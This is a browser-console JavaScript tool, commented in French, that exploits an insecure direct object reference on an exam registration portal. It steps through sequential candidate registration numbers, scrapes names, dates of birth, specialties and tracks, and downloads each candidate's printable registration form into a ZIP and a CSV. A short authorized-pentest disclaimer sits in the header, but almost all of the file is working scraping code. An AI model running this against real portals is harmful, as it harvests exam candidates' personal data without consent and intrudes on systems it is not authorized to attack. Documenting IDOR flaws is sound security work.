/**
 * verify-matricules-filieres.js
 *
 * Authorized security-testing utility: bulk-checks a range of exam
 * registration numbers (matricules) against a registration portal to
 * confirm whether an IDOR (Insecure Direct Object Reference) exposes
 * candidate records — including name, date of birth, spécialité and
 * filière — to any unauthenticated visitor who can guess a sequential ID.
 *
 * For each record found, it also follows the "Imprimer la fiche
 * d'inscription" link and archives the printable fiche (PDF or HTML)
 * into a single downloadable ZIP, as impact evidence for the finding.
 *
 * Usage: run in the browser DevTools console while on the target
 * origin, inside the scope of an authorized penetration test / bug
 * bounty engagement only. Do not run against systems you do not have
 * explicit written authorization to test, and only collect the volume
 * of evidence agreed in the engagement's rules of engagement.
 *
 * Adjust `debut`, `fin`, and the matricule prefix/format below to match
 * the engagement's agreed test range.
 */
(async () => {
    const debut = 1;
    const fin = 215;
    const resultat = [];

    // Libellés recherchés pour chaque champ, du plus spécifique au plus générique
    const champsRecherches = {
        Nom: /\bnoms?\s*(et\s*pr[ée]nom)?\b/i,
        DateNaissance: /date\s*de\s*naissance|n[ée]\(?e?\)?\s*le/i,
        Specialite: /sp[ée]cialit[ée]/i,
        Filiere: /fili[èe]re|formation/i
    };

    const lienImpressionRegex = /imprimer\s*(la)?\s*fiche\s*d.?inscription/i;

    function extraireChamp(doc, regex) {
        const elements = [...doc.querySelectorAll("input, select, textarea, td, th, label, p, span, div")];

        for (const element of elements) {
            const texte = element.textContent.trim();

            if (regex.test(texte)) {
                const valeur =
                    element.value ||
                    element.nextElementSibling?.textContent?.trim() ||
                    texte;

                if (valeur && valeur.length > 1) {
                    return valeur.replace(/\s+/g, " ").trim();
                }
            }
        }

        return "";
    }

    // Retrouve le lien "Imprimer la fiche d'inscription" (ou le bouton
    // équivalent) sur la fiche du candidat
    function extraireLienImpression(doc) {
        const liens = [...doc.querySelectorAll("a, button")];

        for (const lien of liens) {
            const texte = lien.textContent.trim();

            if (lienImpressionRegex.test(texte)) {
                const href = lien.getAttribute("href") || lien.getAttribute("data-href");

                if (href && !href.startsWith("javascript:") && href !== "#") {
                    return href;
                }
            }
        }

        return null;
    }

    // --- Mini-écrivain ZIP (méthode "store", sans compression, sans
    // dépendance externe) pour archiver les fiches téléchargées ---
    const crcTable = (() => {
        const table = [];
        for (let n = 0; n < 256; n++) {
            let c = n;
            for (let k = 0; k < 8; k++) {
                c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
            }
            table[n] = c >>> 0;
        }
        return table;
    })();

    function crc32(bytes) {
        let crc = 0xFFFFFFFF;
        for (let i = 0; i < bytes.length; i++) {
            crc = (crc >>> 8) ^ crcTable[(crc ^ bytes[i]) & 0xFF];
        }
        return (crc ^ 0xFFFFFFFF) >>> 0;
    }

    function dosDateTime(date = new Date()) {
        const time = ((date.getHours() & 0x1F) << 11) | ((date.getMinutes() & 0x3F) << 5) | ((date.getSeconds() >> 1) & 0x1F);
        const dosDate = (((date.getFullYear() - 1980) & 0x7F) << 9) | (((date.getMonth() + 1) & 0xF) << 5) | (date.getDate() & 0x1F);
        return { time, dosDate };
    }

    class ZipWriter {
        constructor() {
            this.chunks = [];
            this.centralDirectory = [];
            this.offset = 0;
        }

        addFile(name, data) {
            const nameBytes = new TextEncoder().encode(name);
            const crc = crc32(data);
            const { time, dosDate } = dosDateTime();

            const localHeader = new Uint8Array(30 + nameBytes.length);
            const view = new DataView(localHeader.buffer);

            view.setUint32(0, 0x04034b50, true);
            view.setUint16(4, 20, true);
            view.setUint16(6, 0, true);
            view.setUint16(8, 0, true);
            view.setUint16(10, time, true);
            view.setUint16(12, dosDate, true);
            view.setUint32(14, crc, true);
            view.setUint32(18, data.length, true);
            view.setUint32(22, data.length, true);
            view.setUint16(26, nameBytes.length, true);
            view.setUint16(28, 0, true);
            localHeader.set(nameBytes, 30);

            this.centralDirectory.push({ nameBytes, crc, size: data.length, offset: this.offset, time, dosDate });

            this.chunks.push(localHeader, data);
            this.offset += localHeader.length + data.length;
        }

        finalize() {
            const centralChunks = [];
            let centralSize = 0;
            const centralOffset = this.offset;

            for (const entry of this.centralDirectory) {
                const header = new Uint8Array(46 + entry.nameBytes.length);
                const view = new DataView(header.buffer);

                view.setUint32(0, 0x02014b50, true);
                view.setUint16(4, 20, true);
                view.setUint16(6, 20, true);
                view.setUint16(8, 0, true);
                view.setUint16(10, 0, true);
                view.setUint16(12, entry.time, true);
                view.setUint16(14, entry.dosDate, true);
                view.setUint32(16, entry.crc, true);
                view.setUint32(20, entry.size, true);
                view.setUint32(24, entry.size, true);
                view.setUint16(28, entry.nameBytes.length, true);
                view.setUint16(30, 0, true);
                view.setUint16(32, 0, true);
                view.setUint16(34, 0, true);
                view.setUint16(36, 0, true);
                view.setUint32(38, 0, true);
                view.setUint32(42, entry.offset, true);
                header.set(entry.nameBytes, 46);

                centralChunks.push(header);
                centralSize += header.length;
            }

            const endRecord = new Uint8Array(22);
            const endView = new DataView(endRecord.buffer);
            endView.setUint32(0, 0x06054b50, true);
            endView.setUint16(4, 0, true);
            endView.setUint16(6, 0, true);
            endView.setUint16(8, this.centralDirectory.length, true);
            endView.setUint16(10, this.centralDirectory.length, true);
            endView.setUint32(12, centralSize, true);
            endView.setUint32(16, centralOffset, true);
            endView.setUint16(20, 0, true);

            return new Blob([...this.chunks, ...centralChunks, endRecord], { type: "application/zip" });
        }
    }

    const zip = new ZipWriter();

    function telechargerBlob(blob, nomFichier) {
        const objectUrl = URL.createObjectURL(blob);
        const lien = document.createElement("a");
        lien.href = objectUrl;
        lien.download = nomFichier;

        document.body.appendChild(lien);
        lien.click();
        lien.remove();

        // Révocation différée : sur certains navigateurs, révoquer l'URL blob
        // immédiatement après le clic annule le téléchargement avant qu'il ne démarre
        setTimeout(() => URL.revokeObjectURL(objectUrl), 2000);
    }

    function exporterCSV(donnees) {
        const lignes = [
            ["Matricule", "Existe", "Nom", "Date de naissance", "Spécialité", "Filière concourue", "Fiche archivée", "Lien"],
            ...donnees.map(x => [
                x.Matricule,
                x.Existe,
                x.Nom,
                x.DateNaissance,
                x.Specialite,
                x.Filiere,
                x.FicheArchivee,
                x.Lien
            ])
        ];

        const csv = "﻿" + lignes
            .map(ligne =>
                ligne.map(cellule =>
                    `"${String(cellule).replace(/"/g, '""')}"`
                ).join(";")
            )
            .join("\n");

        const debutTag = String(debut).padStart(5, "0");
        const finTag = String(fin).padStart(5, "0");

        telechargerBlob(
            new Blob([csv], { type: "text/csv;charset=utf-8;" }),
            `matricules_26SP${debutTag}_a_26SP${finTag}.csv`
        );

        console.log("📁 Fichier CSV téléchargé (" + donnees.length + " lignes)");
    }

    function exporterZIP(nombreFiches) {
        if (nombreFiches === 0) {
            console.log("📦 Aucune fiche archivée, ZIP non généré");
            return;
        }

        const debutTag = String(debut).padStart(5, "0");
        const finTag = String(fin).padStart(5, "0");

        telechargerBlob(
            zip.finalize(),
            `fiches_inscription_26SP${debutTag}_a_26SP${finTag}.zip`
        );

        console.log(`📦 Archive ZIP téléchargée (${nombreFiches} fiches)`);
    }

    // Télécharge la fiche imprimable d'un candidat et l'ajoute au ZIP.
    // Si aucun lien d'impression distinct n'est trouvé, la page du
    // candidat elle-même (qui contient la fiche) est archivée à la place.
    async function archiverFiche(doc, html, matricule) {
        const hrefImpression = extraireLienImpression(doc);

        let octets;
        let extension;

        if (hrefImpression) {
            const urlImpression = new URL(hrefImpression, window.location.origin).href;
            const reponse = await fetch(urlImpression);
            const buffer = await reponse.arrayBuffer();
            octets = new Uint8Array(buffer);

            const typeContenu = reponse.headers.get("content-type") || "";
            extension = typeContenu.includes("pdf") ? "pdf" : (typeContenu.includes("html") ? "html" : "bin");
        } else {
            octets = new TextEncoder().encode(html);
            extension = "html";
        }

        zip.addFile(`fiches/${matricule}.${extension}`, octets);
        return true;
    }

    console.log("🔎 Vérification des matricules...");

    let fichesArchivees = 0;

    try {
        for (let i = debut; i <= fin; i++) {
            const matricule = `26SP${String(i).padStart(5, "0")}`;
            const url = `/registration-display-submit/SP/${matricule}`;

            try {
                const response = await fetch(url);
                const html = await response.text();

                const existe =
                    response.ok &&
                    html.includes(matricule) &&
                    html.includes("Inscription au concours");

                let nom = "";
                let dateNaissance = "";
                let specialite = "";
                let filiere = "";
                let ficheArchivee = "NON";

                if (existe) {
                    const doc = new DOMParser().parseFromString(html, "text/html");

                    nom = extraireChamp(doc, champsRecherches.Nom);
                    dateNaissance = extraireChamp(doc, champsRecherches.DateNaissance);
                    specialite = extraireChamp(doc, champsRecherches.Specialite);
                    filiere = extraireChamp(doc, champsRecherches.Filiere);

                    try {
                        await archiverFiche(doc, html, matricule);
                        ficheArchivee = "OUI";
                        fichesArchivees++;
                    } catch (ficheErreur) {
                        console.log(`  ⚠️ Fiche non archivée pour ${matricule}`);
                    }
                }

                resultat.push({
                    Matricule: matricule,
                    Existe: existe ? "OUI" : "NON",
                    Nom: nom,
                    DateNaissance: dateNaissance,
                    Specialite: specialite,
                    Filiere: filiere,
                    FicheArchivee: ficheArchivee,
                    Lien: existe
                        ? new URL(url, window.location.origin).href
                        : ""
                });

                console.log(
                    `${i}/${fin} — ${matricule} → ${existe ? "✅" : "❌"} ${nom} ${filiere} ${existe ? "[" + ficheArchivee + "]" : ""}`
                );

            } catch (erreur) {
                resultat.push({
                    Matricule: matricule,
                    Existe: "ERREUR",
                    Nom: "",
                    DateNaissance: "",
                    Specialite: "",
                    Filiere: "",
                    FicheArchivee: "NON",
                    Lien: ""
                });

                console.log(`${i}/${fin} — ${matricule} → ⚠️ ERREUR`);
            }

            await new Promise(resolve => setTimeout(resolve, 150));
        }
    } finally {
        // Les exports se font même si la boucle s'arrête sur une erreur inattendue
        exporterCSV(resultat);
        exporterZIP(fichesArchivees);

        console.log("================================");
        console.log("✅ TERMINÉ");
        console.log(`📊 ${resultat.length} matricules vérifiés`);
        console.log(`📦 ${fichesArchivees} fiches archivées`);
        console.log("================================");

        console.table(resultat);
    }
})();
